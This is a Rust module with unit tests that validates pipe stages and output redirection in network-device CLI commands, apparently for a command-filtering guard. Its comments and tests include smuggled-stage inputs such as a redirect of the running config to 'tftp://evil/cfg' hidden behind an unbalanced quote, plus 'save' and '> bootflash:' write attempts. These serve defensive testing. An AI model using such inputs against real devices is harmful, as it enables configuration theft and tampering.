//! Pipe-suffix handling.
//!
//! Network OS CLIs let you append `| <stage>` to filter / format
//! output: `show route | match BGP | count`. Each stage has its own
//! semantics and side-effect surface, so we validate them
//! independently against per-vendor `pipe_allowed` and `pipe_blocked`
//! lists. Any blocked stage trips the whole command — a single
//! `| save /tmp/foo` is enough to deny `show config | save /tmp/foo`
//! even though `show config` itself would be allowed.
//!
//! Splitting respects shell-like quoting because regex pipe
//! arguments commonly contain `|` for alternation:
//! `show running-config | egrep '(vlan|vrf)'`. Without quote
//! awareness the inner `|` would be mis-read as a pipe separator
//! and the stage `egrep '(vlan` would default-deny — a false
//! positive that breaks normal day-to-day operator workflows.

/// Split a canonical command on `|` and return:
///   - the head (everything before the first unquoted `|`)
///   - the pipe stages (everything after each unquoted `|`, trimmed)
///
/// Empty stages (consecutive `||` or trailing `|`) are kept as
/// empty strings so the caller can reject them as default-deny.
/// We don't silently drop them — that would let an attacker hide
/// a stage behind a leading empty stage in some pathological
/// canonicalization edge case.
///
/// `'` and `"` toggle quote state. They don't nest (single inside
/// double is literal `'`, and vice versa), matching shell semantics.
/// Backslash escaping is not supported in v1 — none of the pipe
/// verbs we allow take backslash-escape-bearing arguments.
pub fn split_pipe(canonical: &str) -> (&str, Vec<&str>) {
    let mut splits: Vec<&str> = Vec::new();
    let mut start = 0usize;
    let mut in_single = false;
    let mut in_double = false;
    for (i, c) in canonical.char_indices() {
        match c {
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '|' if !in_single && !in_double => {
                splits.push(canonical[start..i].trim());
                // `|` is one byte in UTF-8; advance past it.
                start = i + c.len_utf8();
            }
            _ => {}
        }
    }
    splits.push(canonical[start..].trim());

    // The first slice is always the head (non-pipe prefix). Subsequent
    // slices are stages. `splits.remove(0)` is fine — splits.len() >= 1
    // because we always push the trailing slice.
    let head = splits.remove(0);
    (head, splits)
}

/// Split on EVERY `|`, ignoring quote state — the view a network-OS
/// output-modifier parser (which generally does NOT honor shell
/// quoting) actually sees.
///
/// Used ONLY for the block check. [`split_pipe`]'s quote-awareness is
/// correct for the *allow* side (so `egrep '(vlan|vrf)'` isn't
/// mis-split into a default-denied stage), but a `|` it hid inside
/// quotes is still a real stage boundary to the device. A
/// `pipe_blocked` verb must therefore be caught even when it rides
/// behind an (often unbalanced) quote — e.g.
/// `show run | include x" | redirect tftp://evil/cfg`, where the
/// second `|` sits inside a lone `"` that our quote-aware splitter
/// swallows but the device does not. Every element is trimmed; the
/// first element is the head.
pub fn split_pipe_quote_agnostic(canonical: &str) -> Vec<&str> {
    canonical.split('|').map(str::trim).collect()
}

/// True if `canonical` contains an unquoted `>` — native output
/// redirection to a file on NX-OS (and other OSes) that persists a
/// command's output to the device filesystem (`show run > bootflash:cfg`).
///
/// [`split_pipe`] models only `|`, so without this a `>` rides the
/// head's allow match straight to a device write. Quote state is
/// tracked (same toggling as [`split_pipe`]) so a `>` inside a filter
/// regex argument (`| match ">"`) is not flagged.
pub fn contains_unquoted_redirect(canonical: &str) -> bool {
    let mut in_single = false;
    let mut in_double = false;
    for c in canonical.chars() {
        match c {
            '\'' if !in_double => in_single = !in_single,
            '"' if !in_single => in_double = !in_double,
            '>' if !in_single && !in_double => return true,
            _ => {}
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn no_pipe_yields_head_only() {
        let (head, stages) = split_pipe("show version");
        assert_eq!(head, "show version");
        assert!(stages.is_empty());
    }

    #[test]
    fn single_pipe_yields_one_stage() {
        let (head, stages) = split_pipe("show route | match BGP");
        assert_eq!(head, "show route");
        assert_eq!(stages, vec!["match BGP"]);
    }

    #[test]
    fn multiple_pipes_yield_multiple_stages() {
        let (head, stages) = split_pipe("show config | display set | match interface | count");
        assert_eq!(head, "show config");
        assert_eq!(stages, vec!["display set", "match interface", "count"]);
    }

    #[test]
    fn whitespace_around_pipes_is_stripped() {
        let (head, stages) = split_pipe("show  |   match foo   |  count  ");
        assert_eq!(head, "show");
        assert_eq!(stages, vec!["match foo", "count"]);
    }

    #[test]
    fn empty_stages_preserved_as_empty_strings() {
        // A trailing pipe with no stage. The evaluator should
        // default-deny on the empty stage, NOT silently allow.
        let (head, stages) = split_pipe("show |");
        assert_eq!(head, "show");
        assert_eq!(stages, vec![""]);
    }

    #[test]
    fn empty_input_yields_empty_head() {
        let (head, stages) = split_pipe("");
        assert_eq!(head, "");
        assert!(stages.is_empty());
    }

    #[test]
    fn pipe_inside_single_quotes_does_not_split() {
        let (head, stages) = split_pipe("show run | egrep '(vlan|vrf)'");
        assert_eq!(head, "show run");
        assert_eq!(stages, vec!["egrep '(vlan|vrf)'"]);
    }

    #[test]
    fn pipe_inside_double_quotes_does_not_split() {
        let (head, stages) = split_pipe("show run | grep \"a|b\"");
        assert_eq!(head, "show run");
        assert_eq!(stages, vec!["grep \"a|b\""]);
    }

    #[test]
    fn unmatched_quote_swallows_the_remainder() {
        // Pathological input — a single quote with no closer means
        // everything after it is "inside the quote" and not split.
        // This is fine: the resulting stage will fail allow-list
        // matching anyway. Document the behavior so a reader doesn't
        // mistake it for a bug.
        let (head, stages) = split_pipe("show | foo'unmatched | save x");
        assert_eq!(head, "show");
        assert_eq!(stages, vec!["foo'unmatched | save x"]);
    }

    #[test]
    fn nested_quote_chars_are_literal() {
        // `'` inside `"..."` is literal; `"` inside `'...'` is literal.
        // Matches POSIX shell semantics.
        let (head, stages) = split_pipe(r#"show | grep "it's | mine""#);
        assert_eq!(head, "show");
        assert_eq!(stages, vec![r#"grep "it's | mine""#]);
    }

    /// Pin the `!in_double` guard on the `'` arm. With the guard
    /// removed (or replaced with `true`), an apostrophe inside
    /// `"..."` would incorrectly enter single-quote mode and
    /// SUPPRESS subsequent pipe splits. That would let an attacker
    /// hide a `| save x` after a string-literal `'`.
    #[test]
    fn apostrophe_inside_double_quotes_does_not_enter_single_quote_mode() {
        // After the closing `"`, both quote flags must be false so
        // the next `|` splits cleanly. The buggy version would
        // leave in_single=true and absorb the `|`.
        let (head, stages) = split_pipe(r#"show | grep "it's mine" | save x"#);
        assert_eq!(head, "show");
        assert_eq!(
            stages,
            vec![r#"grep "it's mine""#, "save x"],
            "apostrophe inside double quotes must NOT toggle in_single"
        );
    }

    /// Pin the `!in_single` guard on the `"` arm. Symmetric to the
    /// test above. Without the guard, a `"` inside `'...'` would
    /// incorrectly enter double-quote mode.
    #[test]
    fn doublequote_inside_single_quotes_does_not_enter_double_quote_mode() {
        let (head, stages) = split_pipe(r#"show | grep 'a"b' | save x"#);
        assert_eq!(head, "show");
        assert_eq!(
            stages,
            vec![r#"grep 'a"b'"#, "save x"],
            "double-quote inside single quotes must NOT toggle in_double"
        );
    }

    // ---- quote-agnostic block scan + redirect guard (2026-07 review) ----

    #[test]
    fn quote_agnostic_split_sees_pipe_hidden_by_unbalanced_quote() {
        // The exploit shape: `split_pipe` (quote-aware) hides the second
        // `|` inside the lone `"`, but the device does not.
        let (_, aware) = split_pipe(r#"show run | include x" | redirect tftp://e/c"#);
        assert_eq!(
            aware,
            vec![r#"include x" | redirect tftp://e/c"#],
            "quote-aware split swallows the second `|` (the bug being defended)"
        );
        let agnostic = split_pipe_quote_agnostic(r#"show run | include x" | redirect tftp://e/c"#);
        assert_eq!(
            agnostic,
            vec!["show run", r#"include x""#, "redirect tftp://e/c"],
            "quote-agnostic split exposes the hidden redirect stage"
        );
    }

    #[test]
    fn contains_unquoted_redirect_flags_only_unquoted_gt() {
        // Unquoted `>` / `>>` is redirection.
        assert!(contains_unquoted_redirect(
            "show running-config > bootflash:cfg"
        ));
        assert!(contains_unquoted_redirect("show run >> file"));
        assert!(!contains_unquoted_redirect("show interfaces terse"));
        // A `>` inside a quoted filter argument is NOT redirection —
        // both quote styles.
        assert!(!contains_unquoted_redirect(r#"show route | match ">""#));
        assert!(!contains_unquoted_redirect("show route | match '>'"));
    }

    /// Pin the quote-nesting guards inside `contains_unquoted_redirect`
    /// (mutation coverage). Each case fails if a `'`/`"` toggle guard is
    /// broken, because a `>` would then be mis-classified as quoted or
    /// unquoted.
    #[test]
    fn redirect_guard_respects_quote_nesting() {
        // A `'` inside `"..."` must NOT open single-quote mode, so the
        // `>` after the CLOSED double-quote is still flagged.
        assert!(contains_unquoted_redirect(r#"show "a'b" > c"#));
        // Symmetrically, a `"` inside '...' must NOT open double-quote
        // mode, so the `>` after the closed single-quote is flagged.
        assert!(contains_unquoted_redirect(r#"show 'a"b' > c"#));
    }
}
